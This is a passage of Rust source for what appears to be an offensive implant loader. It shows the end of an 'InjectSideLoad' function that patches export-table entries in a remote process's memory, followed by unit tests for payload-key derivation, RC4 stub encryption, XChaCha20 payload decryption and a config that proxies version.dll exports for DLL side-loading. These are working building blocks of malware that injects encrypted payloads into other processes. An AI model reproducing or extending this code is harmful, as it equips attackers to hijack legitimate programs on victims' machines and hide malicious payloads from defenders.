                h_proc as u64,
                func_rva_slot as u64,
                new_rva_bytes.as_ptr() as u64,
                4u64,
                &mut bw as *mut _ as u64,
            ) {
                Ok(s) if s >= 0 && bw == 4 => {
                    patched += 1;
                }
                _ => {
                    tracing::warn!(
                        "InjectSideLoad: failed to patch export '{}' at ordinal {}",
                        export_name,
                        ordinal
                    );
                }
            }
        }
    }

    tracing::info!(
        patched,
        total = patch_targets.len(),
        "InjectSideLoad: export table patching complete"
    );
    Ok(())
}

// ══════════════════════════════════════════════════════════════════════════════
//  TESTS (cross-platform)
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_derive_payload_key_is_deterministic() {
        let key1 = derive_payload_key();
        let key2 = derive_payload_key();
        assert_eq!(key1, key2, "derive_payload_key must be deterministic");
        assert_ne!(key1, [0u8; 32], "key must not be all zeros");
    }

    #[test]
    fn test_derive_stub_rc4_key_is_deterministic() {
        let key1 = derive_stub_rc4_key();
        let key2 = derive_stub_rc4_key();
        assert_eq!(key1, key2, "derive_stub_rc4_key must be deterministic");
        assert_ne!(key1, [0u8; 16], "key must not be all zeros");
    }

    #[test]
    fn test_payload_key_and_rc4_key_differ() {
        let payload_key = derive_payload_key();
        let rc4_key = derive_stub_rc4_key();
        assert_ne!(
            &payload_key[..16],
            rc4_key.as_slice(),
            "different info labels must produce different keys"
        );
    }

    #[test]
    fn test_hkdf_sha256_derive_deterministic() {
        let ikm = b"test_ikm_123";
        let salt = b"test_salt";
        let info = b"test_info";
        let k1 = hkdf_sha256_derive(ikm, salt, info, 32);
        let k2 = hkdf_sha256_derive(ikm, salt, info, 32);
        assert_eq!(k1, k2, "same HKDF inputs → same output");
    }

    #[test]
    fn test_hkdf_sha256_derive_different_info() {
        let ikm = b"test_ikm_123";
        let salt = b"test_salt";
        let k1 = hkdf_sha256_derive(ikm, salt, b"context_a", 32);
        let k2 = hkdf_sha256_derive(ikm, salt, b"context_b", 32);
        assert_ne!(k1, k2, "different info → different keys");
    }

    #[test]
    fn test_hkdf_sha256_derive_different_salt() {
        let ikm = b"test_ikm_123";
        let info = b"test_info";
        let k1 = hkdf_sha256_derive(ikm, b"salt_a", info, 32);
        let k2 = hkdf_sha256_derive(ikm, b"salt_b", info, 32);
        assert_ne!(k1, k2, "different salt → different keys");
    }

    #[test]
    fn test_hkdf_sha256_derive_output_len() {
        let out = hkdf_sha256_derive(b"ikm", b"salt", b"info", 48);
        assert_eq!(out.len(), 48);
        // Should produce at least 2 blocks (32 + 16 bytes)
        let out = hkdf_sha256_derive(b"ikm", b"salt", b"info", 64);
        assert_eq!(out.len(), 64);
    }

    /// RFC 5869 Test Case 1 (SHA-256) verification vector.
    #[test]
    fn test_hkdf_sha256_rfc5869_vector() {
        // RFC 5869, Appendix A, Test Case 1
        let ikm = hex::decode("0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b").unwrap();
        let salt = hex::decode("000102030405060708090a0b0c").unwrap();
        let info = hex::decode("f0f1f2f3f4f5f6f7f8f9").unwrap();
        let expected_okm = hex::decode(
            "3cb25f25faacd57a90434f64d0362f2a2d2d0a90cf1a5a4c5db02d56ecc4c5bf34007208d5b887185865",
        )
        .unwrap();

        // Verify our HKDF matches RFC 5869 test vector.
        let okm = hkdf_sha256_derive(&ikm, &salt, &info, 42);
        assert_eq!(
            okm, expected_okm,
            "HKDF OKM must match RFC 5869 Test Case 1"
        );
    }

    #[test]
    fn test_rc4_roundtrip() {
        let key = b"test_rc4_key_1234";
        let plaintext = b"Hello, RC4! This is a test payload.";
        let encrypted = rc4_encrypt(plaintext, key);
        assert_ne!(encrypted.as_slice(), plaintext);
        let decrypted = rc4_encrypt(&encrypted, key);
        assert_eq!(decrypted.as_slice(), plaintext);
    }

    #[test]
    fn test_rc4_empty_payload() {
        let key = b"testkey";
        let encrypted = rc4_encrypt(b"", key);
        assert!(encrypted.is_empty());
    }

    #[test]
    fn test_rc4_different_keys_different_output() {
        let plaintext = b"same input data";
        let enc1 = rc4_encrypt(plaintext, b"key1");
        let enc2 = rc4_encrypt(plaintext, b"key2");
        assert_ne!(enc1, enc2);
    }

    #[test]
    fn test_rc4_deterministic() {
        let key = b"deterministic_key";
        let plaintext = b"deterministic test data";
        let enc1 = rc4_encrypt(plaintext, key);
        let enc2 = rc4_encrypt(plaintext, key);
        assert_eq!(enc1, enc2);
    }

    #[test]
    fn test_decrypt_too_short_blob_returns_error() {
        let key = [0u8; 32];
        let short_blob = [0u8; 20]; // < 40 bytes
        let result = decrypt_xchacha20_payload(&short_blob, &key);
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_invalid_blob_returns_error() {
        let key = [0u8; 32];
        let blob = vec![0xAA; 100]; // valid length, but not a valid ciphertext
        let result = decrypt_xchacha20_payload(&blob, &key);
        assert!(result.is_err());
    }

    #[test]
    fn test_xchacha20_encrypt_decrypt_roundtrip() {
        use chacha20poly1305::aead::rand_core::RngCore;
        use chacha20poly1305::{
            aead::{Aead, KeyInit, OsRng},
            XChaCha20Poly1305, XNonce,
        };

        let key_bytes: [u8; 32] = derive_payload_key();
        let cipher = XChaCha20Poly1305::new(&key_bytes.into());

        let mut nonce_bytes = [0u8; 24];
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = XNonce::from_slice(&nonce_bytes);

        let plaintext = b"This is a test payload for XChaCha20-Poly1305 roundtrip.";
        let ciphertext = cipher.encrypt(nonce, plaintext.as_slice()).unwrap();

        // Build the blob: [nonce][tag+ciphertext]
        let mut blob = Vec::with_capacity(24 + ciphertext.len());
        blob.extend_from_slice(&nonce_bytes);
        blob.extend_from_slice(&ciphertext);

        let decrypted = decrypt_xchacha20_payload(&blob, &key_bytes).unwrap();
        assert_eq!(decrypted, plaintext.as_slice());
    }

    #[test]
    fn test_export_config_default() {
        let config = ExportConfig::default();
        assert!(config.forward_target.is_empty());
        assert!(config.named_exports.is_empty());
        assert!(config.ordinal_exports.is_empty());
    }

    #[test]
    fn test_export_config_with_values() {
        let config = ExportConfig {
            forward_target: "version.dll".to_string(),
            named_exports: vec!["GetFileVersionInfoA".to_string()],
            ordinal_exports: vec![(1, "GetFileVersionInfoByHandle".to_string())],
        };
        assert_eq!(config.forward_target, "version.dll");
        assert_eq!(config.named_exports.len(), 1);
        assert_eq!(config.ordinal_exports.len(), 1);
    }
}
